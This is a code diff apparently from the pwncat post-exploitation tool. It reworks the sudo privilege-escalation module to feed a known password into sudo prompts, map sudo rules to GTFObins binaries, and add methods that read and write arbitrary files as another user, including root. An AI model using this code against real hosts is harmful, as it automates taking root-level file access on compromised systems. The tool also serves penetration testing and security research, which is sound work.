@@ -5,9 +5,14 @@ import sys
 from time import sleep
 import os
 from colorama import Fore, Style
-from io import StringIO
+import socket
+from io import StringIO, BytesIO
+import functools
 
+from pwncat.util import CTRL_C
 from pwncat.privesc.base import Method, PrivescError, Technique
+from pwncat.file import RemoteBinaryPipe
+
 from pwncat.pysudoers import Sudoers
 from pwncat import gtfobins
 from pwncat.privesc import Capability
@@ -22,6 +27,49 @@ class SudoMethod(Method):
     def __init__(self, pty: "pwncat.pty.PtyHandler"):
         super(SudoMethod, self).__init__(pty)
 
+    def send_password(self, current_user):
+
+        output = self.pty.client.recv(6, socket.MSG_PEEK).lower()
+
+        if output == b"[sudo]" or output == b"passwo":
+            if current_user["password"] is None:
+                self.pty.client.send(CTRL_C)  # break out of password prompt
+                raise PrivescError(
+                    f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} has no known password"
+                )
+        else:
+            return  # it did not ask for a password, continue as usual
+
+        # Reset the timeout to allow for sudo to pause
+        old_timeout = self.pty.client.gettimeout()
+        self.pty.client.settimeout(5)
+        self.pty.client.send(current_user["password"].encode("utf-8") + b"\n")
+
+        # Flush the rest of the password prompt
+        self.pty.recvuntil("\n")
+
+        # Check the output once more
+        output = self.pty.client.recv(6, socket.MSG_PEEK).lower()
+
+        # Reset the timeout to the originl value
+        self.pty.client.settimeout(old_timeout)
+
+        if (
+            output == b"[sudo]"
+            or output == b"passwo"
+            or output == b"sorry,"
+            or output == b"sudo: "
+        ):
+            self.pty.client.send(CTRL_C)  # break out of password prompt
+
+            # Flush all the output
+            self.pty.recvuntil(b"\n")
+            raise PrivescError(
+                f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} could not sudo"
+            )
+
+        return
+
     def find_sudo(self):
 
         current_user = self.pty.current_user
@@ -29,58 +77,11 @@ class SudoMethod(Method):
         # Process the prompt but it will not wait for the end of the output
         # delim = self.pty.process("sudo -l", delim=True)
         delim = self.pty.process("sudo -p 'Password: ' -l", delim=True)
-        output = self.pty.client.recv(6).lower()
 
-        if output == b"[sudo]" or output == b"passwo":
-            if current_user["password"] is None:
-                self.pty.client.send(util.CTRL_C)  # break out of password prompt
-                raise PrivescError(
-                    f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} has no known password"
-                )
+        self.send_password(current_user)
 
-            # Reset the timeout to allow for sudo to pause
-            old_timeout = self.pty.client.gettimeout()
-            self.pty.client.settimeout(5)
-            self.pty.client.send(current_user["password"].encode("utf-8") + b"\n")
-
-            # Flush the rest of the password prompt
-            self.pty.recvuntil("\n")
-
-            # Check the output once more
-            output = self.pty.client.recv(6).lower()
-
-            # Reset the timeout to the originl value
-            self.pty.client.settimeout(old_timeout)
-
-            if (
-                output == b"[sudo]"
-                or output == b"passwo"
-                or output == b"sorry,"
-                or output == b"sudo: "
-            ):
-                self.pty.client.send(util.CTRL_C)  # break out of password prompt
-
-                # Handle the edge case sudo telling us something
-                if output == b"sorry,":
-                    # Check if this user cannot run sudo
-                    sudo_response = self.pty.recvuntil("\n").lower()
-
-                    if b"may not run sudo" in sudo_response:
-
-                        # Flush all the output
-                        self.pty.recvuntil(delim)
-                        raise PrivescError(
-                            f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} may not run sudo"
-                        )
-
-                # Flush all the output
-                self.pty.recvuntil(delim)
-                raise PrivescError(
-                    f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} seemingly has an incorrect password"
-                )
-
+        # Get the sudo -l output
         output = self.pty.recvuntil(delim).split(delim)[0].strip()
-
         sudo_output_lines = output.split(b"\n")
 
         # Determine the starting line of the valuable sudo input
@@ -180,38 +181,41 @@ class SudoMethod(Method):
                 # The PtyHandler.which method is used to verify the presence of
                 # different GTFObins on the remote system when an "ALL" spec is
                 # found.
-                sudo_privesc["command"], binary = gtfobins.Binary.find_sudo(
-                    sudo_privesc["command"], self.pty.which
+                # sudo_privesc["command"], binary = gtfobins.Binary.find_sudo(
+                #     sudo_privesc["command"], self.pty.which
+                # )
+                binaries = gtfobins.Binary.find_sudo(
+                    sudo_privesc["command"], self.pty.which, capability
                 )
             except gtfobins.SudoNotPossible:
                 # No GTFObins possible with this sudo spec
                 continue
 
-            # If this binary cannot sudo, don't bother with it
-            if not (binary.capabilities & Capability.SUDO):
-                continue
-
-            if sudo_privesc["run_as_user"] == "ALL":
-                # add a technique for root
-                techniques.append(
-                    Technique(
-                        "root",
-                        self,
-                        (binary, sudo_privesc["command"], sudo_privesc["password"]),
-                        binary.capabilities,
-                    )
-                )
-            else:
-                users = sudo_privesc["run_as_user"].split(",")
-                for u in users:
+            for binary in binaries:
+                command = sudo_privesc["command"]
+                if command == "ALL":
+                    command = binary.path
+                if sudo_privesc["run_as_user"] == "ALL":
+                    # add a technique for root
                     techniques.append(
                         Technique(
-                            u,
+                            "root",
                             self,
-                            (binary, sudo_privesc["command"], sudo_privesc["password"]),
+                            (binary, command, sudo_privesc["password"]),
                             binary.capabilities,
                         )
                     )
+                else:
+                    users = sudo_privesc["run_as_user"].split(",")
+                    for u in users:
+                        techniques.append(
+                            Technique(
+                                u,
+                                self,
+                                (binary, command, sudo_privesc["password"],),
+                                binary.capabilities,
+                            )
+                        )
 
         return techniques
 
@@ -255,3 +259,36 @@ class SudoMethod(Method):
             self.pty.run(exit, wait=False)  # here be dragons
 
         raise PrivescError("failed to privesc")
+
+    def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:
+
+        info(
+            f"attempting to read {Fore.BLUE}{filepath}{Fore.RESET} with {Fore.RED}{self.get_name(technique)}{Fore.RESET}"
+        )
+        binary, sudo_spec, password_required = technique.ident
+
+        read_payload = binary.read_file(
+            filepath, sudo_prefix=f"sudo -u {shlex.quote(technique.user)}"
+        )
+
+        read_pipe = self.pty.run(
+            read_payload,
+            input=functools.partial(self.send_password, self.pty.current_user),
+        )
+
+        return BytesIO(read_pipe)
+
+    def write_file(self, filepath: str, data: bytes, technique: Technique):
+
+        info(
+            f"attempting to write {Fore.BLUE}{filepath}{Fore.RESET} with {Fore.RED}{self.get_name(technique)}{Fore.RESET}"
+        )
+        binary, sudo_spec, password_required = technique.ident
+        payload = binary.write_file(
+            filepath, data, sudo_prefix=f"sudo -u {shlex.quote(technique.user)}"
+        )
+
+        # Run the commands
+        self.pty.run(
+            payload, input=functools.partial(self.send_password, self.pty.current_user),
+        )
